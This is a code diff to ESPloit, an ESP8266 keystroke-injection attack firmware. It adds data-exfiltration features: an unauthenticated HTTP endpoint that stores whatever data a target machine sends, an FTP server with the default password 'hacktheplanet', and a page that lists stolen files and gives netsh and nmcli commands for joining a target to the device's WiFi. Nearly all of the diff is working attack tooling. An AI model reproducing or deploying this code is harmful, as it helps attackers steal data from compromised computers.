@@ -41,6 +41,7 @@
 #include <ESP8266mDNS.h>
 #include <FS.h>
 #include <ArduinoJson.h> // ArduinoJson library 5.11.0 by Benoit Blanchon https://github.com/bblanchon/ArduinoJson
+#include <ESP8266FtpServer.h> // https://github.com/apullin/esp8266FTPServer/tree/feature/bbx10_speedup
 //#include <SoftwareSerial.h>
 //#include <DoubleResetDetector.h> // Double Reset Detector library VERSION: 1.0.0 by Stephen Denne https://github.com/datacute/DoubleResetDetector
 
@@ -60,6 +61,7 @@ DoubleResetDetector drd(DRD_TIMEOUT, DRD_ADDRESS);
 ESP8266WebServer server(80);
 ESP8266WebServer httpServer(1337);
 ESP8266HTTPUpdateServer httpUpdater;
+FtpServer ftpSrv;
 
 HTTPClient http;
 String latestversion = "";
@@ -76,6 +78,9 @@ char gatewaystr[16];
 char subnetstr[16];
 char update_username[32];
 char update_password[64];
+char ftp_username[32];
+char ftp_password[64];
+int ftpenabled;
 int DelayLength;
 int livepayloaddelay;
 int autopwn;
@@ -160,6 +165,16 @@ void settingsPage()
     autopwnyes="";
     autopwnno=" checked=\"checked\"";
   }
+  String ftpenabledyes;
+  String ftpenabledno;
+  if (ftpenabled==1){
+    ftpenabledyes=" checked=\"checked\"";
+    ftpenabledno="";
+  }
+  else {
+    ftpenabledyes="";
+    ftpenabledno=" checked=\"checked\"";
+  }
   String hiddenyes;
   String hiddenno;
   if (hidden==1){
@@ -206,6 +221,12 @@ void settingsPage()
   "<b>ESPloit Administration Settings:</b><br><br>"
   "Username: <input type=\"text\" name=\"update_username\" value=\""+update_username+"\" maxlength=\"31\" size=\"31\"><br>"
   "Password: <input type=\"password\" name=\"update_password\" value=\""+update_password+"\" maxlength=\"64\" size=\"31\"><br><br>"
+  "<hr>"
+  "<b>FTP Exfiltration Server Settings</b><br>"
+  "Enabled <INPUT type=\"radio\" name=\"ftpenabled\" value=\"1\""+ftpenabledyes+"><br>"
+  "Disabled <INPUT type=\"radio\" name=\"ftpenabled\" value=\"0\""+ftpenabledno+"><br><br>"
+  "FTP Username: <input type=\"text\" name=\"ftp_username\" value=\""+ftp_username+"\" maxlength=\"31\" size=\"31\"><br>"
+  "FTP Password: <input type=\"password\" name=\"ftp_password\" value=\""+ftp_password+"\" maxlength=\"64\" size=\"31\"><br><br>"
   "<hr>"
   "<b>Payload Settings:</b><br><br>"
   "Delay Between Sending Lines of Code in Payload:<br><input type=\"number\" name=\"DelayLength\" value=\""+DelayLength+"\" maxlength=\"31\" size=\"10\"> milliseconds (Default: 2000)<br><br>"
@@ -261,6 +282,9 @@ void handleSubmitSettings()
   server.arg("subnetstr").toCharArray(subnetstr, 16);
   server.arg("update_username").toCharArray(update_username, 32);
   server.arg("update_password").toCharArray(update_password, 64);
+  server.arg("ftp_username").toCharArray(ftp_username, 32);
+  server.arg("ftp_password").toCharArray(ftp_password, 64);
+  ftpenabled = server.arg("ftpenabled").toInt();
   DelayLength = server.arg("DelayLength").toInt();
   livepayloaddelay = server.arg("LivePayloadDelay").toInt();
   autopwn = server.arg("autopwn").toInt();
@@ -293,6 +317,9 @@ bool loadDefaults() {
   json["subnet"] = "255.255.255.0";
   json["update_username"] = "admin";
   json["update_password"] = "hacktheplanet";
+  json["ftp_username"] = "ftp-admin";
+  json["ftp_password"] = "hacktheplanet";
+  json["ftpenabled"] = "0";
   json["DelayLength"] = "2000";
   json["LivePayloadDelay"] = "3000";
   json["autopwn"] = "0";
@@ -338,6 +365,10 @@ bool loadConfig() {
   strcpy(update_username, (const char*)json["update_username"]);
   strcpy(update_password, (const char*)json["update_password"]);
 
+  strcpy(ftp_username, (const char*)json["ftp_username"]);
+  strcpy(ftp_password, (const char*)json["ftp_password"]);
+  ftpenabled = json["ftpenabled"];
+  
   DelayLength = json["DelayLength"];
   livepayloaddelay = json["LivePayloadDelay"];
 
@@ -414,6 +445,9 @@ bool saveConfig() {
   json["subnet"] = subnetstr;
   json["update_username"] = update_username;
   json["update_password"] = update_password;
+  json["ftp_username"] = ftp_username;
+  json["ftp_password"] = ftp_password;
+  json["ftpenabled"] = ftpenabled;
   json["DelayLength"] = DelayLength;
   json["LivePayloadDelay"] = livepayloaddelay;
   json["autopwn"] = autopwn;
@@ -453,6 +487,7 @@ void handleFileUpload()
 void ListPayloads(){
   String directory;
   if(server.uri() == "/listpayloads") directory="/payloads";
+  if(server.uri() == "/exfiltrate/list") directory="/";
   FSInfo fs_info;
   SPIFFS.info(fs_info);
   String total;
@@ -464,11 +499,13 @@ void ListPayloads(){
   String FileList = "<a href=\"/\"><- BACK TO INDEX</a><br><br>";
   Dir dir = SPIFFS.openDir(directory);
   if(server.uri() == "/listpayloads") FileList += "File System Info Calculated in Bytes<br><b>Total:</b> "+total+" <b>Free:</b> "+freespace+" "+" <b>Used:</b> "+used+"<br><br><a href=\"/uploadpayload\">Upload Payload</a><br><br><a href=\"/livepayload\">Live Payload Mode</a><br><br><table border='1'><tr><td><b>Display Payload Contents</b></td><td><b>Size in Bytes</b></td><td><b>Run Payload</b></td><td><b>Download File</b></td><td><b>Delete Payload</b></td></tr>";
+  if(server.uri() == "/exfiltrate/list") FileList += String()+F("To exfiltrate data be sure ESPloit and Target machine are on the same network.<br>Either set ESPloit to join the Target's network or set the Target to join ESPloit's AP.<br><small>Current Network Configuration: ESPloit's IP= <b>")+local_IPstr+"</b> SSID = <b>"+ssid+"</b> PASSWORD = <b>"+password+"</b><br>Windows: netsh wlan set hostednetwork mode=allow ssid=\"<b>"+ssid+"</b>\" key=\"<b>"+password+"</b>\"<br>Linux: nmcli dev wifi connect <b>"+ssid+"</b> password <b>"+password+"</b></small><br>For HTTP exfiltration method point the target machine to the url listed below:<br><small>http://<b>"+local_IPstr+"</b>/exfiltrate?file=<b>FILENAME.TXT</b>&data=<b>EXFILTRATED-DATA-HERE</b></small><br>For FTP exfiltration method use the credentials listed below:<br><small>Server: <b>"+local_IPstr+"</b> Username: <b>"+ftp_username+"</b> Password: <b>"+ftp_password+"</b></small><br>See the example payloads for more in depth examples.<br><br>File System Info Calculated in Bytes<br><b>Total:</b> "+total+" <b>Free:</b> "+freespace+" "+" <b>Used:</b> "+used+"<br><br><table border='1'><tr><td><b>Display File Contents</b></td><td><b>Size in Bytes</b></td><td><b>Download File</b></td><td><b>Delete File</b></td></tr>";
   while (dir.next()) {
     String FileName = dir.fileName();
     File f = dir.openFile("r");
     FileList += " ";
     if(server.uri() == "/listpayloads") FileList += "<tr><td><a href=\"/showpayload?payload="+FileName+"\">"+FileName+"</a></td>"+"<td>"+f.size()+"</td><td><a href=\"/dopayload?payload="+FileName+"\"><button>Run Payload</button></a></td><td><a href=\""+FileName+"\"><button>Download File</button></td><td><a href=\"/deletepayload?payload="+FileName+"\"><button>Delete Payload</button></td></tr>";
+    if((server.uri() == "/exfiltrate/list")&&(!FileName.startsWith("/payloads"))&&(!FileName.startsWith("/config.json"))) FileList += "<tr><td><a href=\"/showpayload?payload="+FileName+"\">"+FileName+"</a></td>"+"<td>"+f.size()+"</td><td><a href=\""+FileName+"\"><button>Download File</button></td><td><a href=\"/deletepayload?payload="+FileName+"\"><button>Delete File</button></td></tr>";
   }
   FileList += "</table>";
   server.send(200, "text/html", FileList);
@@ -497,7 +534,8 @@ void ShowPayloads(){
     server.send ( 302, "text/plain", "");
   }
   if (payload.startsWith("/payloads/")) ShowPL = String()+F("<a href=\"/\"><- BACK TO INDEX</a><br><br><a href=\"/listpayloads\">List Payloads</a><br><br><a href=\"/dopayload?payload=")+payload+"\"><button>Run Payload</button></a> - <a href=\""+payload+"\"><button>Download File</button><a> - <a href=\"/deletepayload?payload="+payload+"\"><button>Delete Payload</button></a><pre>"+payload+"\n-----\n"+webString+"</pre>";
-  else ShowPL = String()+F("<a href=\"/\"><- BACK TO INDEX</a><br><br><a href=\"/listpayloads\">List Data</a><br><br><a href=\"")+payload+"\"><button>Download File</button><a> - <a href=\"/deletepayload?payload="+payload+"\"><button>Delete File</button></a><pre>"+payload+"\n-----\n"+webString+"</pre>";
+  else if (!payload.startsWith("/payloads")) ShowPL = String()+F("<a href=\"/\"><- BACK TO INDEX</a><br><br><a href=\"/exfiltrate/list\">List Exfiltrated Data</a><br><br><a href=\"")+payload+"\"><button>Download File</button><a> - <a href=\"/deletepayload?payload="+payload+"\"><button>Delete File</button></a><pre>"+payload+"\n-----\n"+webString+"</pre>";
+  else ShowPL = String()+F("<a href=\"/\"><- BACK TO INDEX</a><br><br><a href=\"/exfiltrate/list\">List Data</a><br><br><a href=\"")+payload+"\"><button>Download File</button><a> - <a href=\"/deletepayload?payload="+payload+"\"><button>Delete File</button></a><pre>"+payload+"\n-----\n"+webString+"</pre>";
   webString="";
   server.send(200, "text/html", ShowPL);
 }
@@ -537,7 +575,7 @@ void setup(void)
       ardversion = "2.0(Guessing)";
       Serial.println("GetVersion:X"); //check 32u4 version info
     }
-    server.send(200, "text/html", String()+F("<html><body><b>ESPloit v")+version+F("</b> - WiFi controlled HID Keyboard Emulator<br><img width='86' height='86' src='data:image/png;base64,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'><br><i>by Corey Harding<br>www.LegacySecurityGroup.com / www.Exploit.Agency</i><br>-----<br>File System Info Calculated in Bytes<br><b>Total:</b> ")+total+" <b>Free:</b> "+freespace+" "+" <b>Used:</b> "+used+F("<br>-----<br><a href=\"/uploadpayload\">Upload Payload</a><br>-<br><a href=\"/listpayloads\">Choose Payload</a><br>-<br><a href=\"/livepayload\">Live Payload Mode</a><br>-<br><a href=\"/inputmode\">Input Mode</a><br>-<br><a href=\"/settings\">Configure ESPloit</a><br>-<br><a href=\"/format\">Format File System</a><br>-<br><a href=\"/firmware\">Upgrade ESPloit Firmware</a><br>-<br><a href=\"/help\">Help</a></body></html>"));
+    server.send(200, "text/html", String()+F("<html><body><b>ESPloit v")+version+F("</b> - WiFi controlled HID Keyboard Emulator<br><img width='86' height='86' src='data:image/png;base64,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'><br><i>by Corey Harding<br>www.LegacySecurityGroup.com / www.Exploit.Agency</i><br>-----<br>File System Info Calculated in Bytes<br><b>Total:</b> ")+total+" <b>Free:</b> "+freespace+" "+" <b>Used:</b> "+used+F("<br>-----<br><a href=\"/uploadpayload\">Upload Payload</a><br>-<br><a href=\"/listpayloads\">Choose Payload</a><br>-<br><a href=\"/livepayload\">Live Payload Mode</a><br>-<br><a href=\"/exfiltrate/list\">List Exfiltrated Data</a><br>-<br><a href=\"/inputmode\">Input Mode</a><br>-<br><a href=\"/settings\">Configure ESPloit</a><br>-<br><a href=\"/format\">Format File System</a><br>-<br><a href=\"/firmware\">Upgrade ESPloit Firmware</a><br>-<br><a href=\"/help\">Help</a></body></html>"));
   });
 
   server.onNotFound([]() {
@@ -667,12 +705,24 @@ void setup(void)
     String deletepayload;
     deletepayload += server.arg(0);
     if (deletepayload.startsWith("/payloads/")) server.send(200, "text/html", String()+F("<a href=\"/\"><- BACK TO INDEX</a><br><br><a href=\"/listpayloads\">List Payloads</a><br><br>Deleting file: ")+deletepayload);
+    if (!deletepayload.startsWith("/payloads/")) server.send(200, "text/html", String()+F("<a href=\"/\"><- BACK TO INDEX</a><br><br><a href=\"/exfiltrate/list\">List Exfiltrated Data</a><br><br>Deleting file: ")+deletepayload);
     SPIFFS.remove(deletepayload);
   });
 
   server.on("/format", [](){
     server.send(200, "text/html", F("<html><body><a href=\"/\"><- BACK TO INDEX</a><br><br>This will reformat the SPIFFS File System.<br><br>Are you sure?<br><br><a href=\"/format/yes\">YES</a> - <a href=\"/\">NO</a></body></html>"));
   });
+
+  server.on("/exfiltrate", [](){
+    String file = server.arg("file");
+    String data = server.arg("data");
+    // open the file in write mode
+    File f = SPIFFS.open(String("/"+file), "w");
+    f.println(data);
+    f.close();
+  });
+
+  server.on("/exfiltrate/list", ListPayloads);
 
   server.on("/reboot", [](){
     if(!server.authenticate(update_username, update_password))
@@ -785,6 +835,10 @@ void setup(void)
   httpServer.begin();
 
   MDNS.addService("http", "tcp", 1337);
+
+  if (ftpenabled==1){
+    ftpSrv.begin(String(ftp_username),String(ftp_password));
+  }
   
   if (autopwn==1){
     runpayload();
@@ -793,6 +847,9 @@ void setup(void)
 }
 
 void loop() {
+  if (ftpenabled==1){
+    ftpSrv.handleFTP();
+  }
   server.handleClient();
   httpServer.handleClient();
 //  drd.loop();
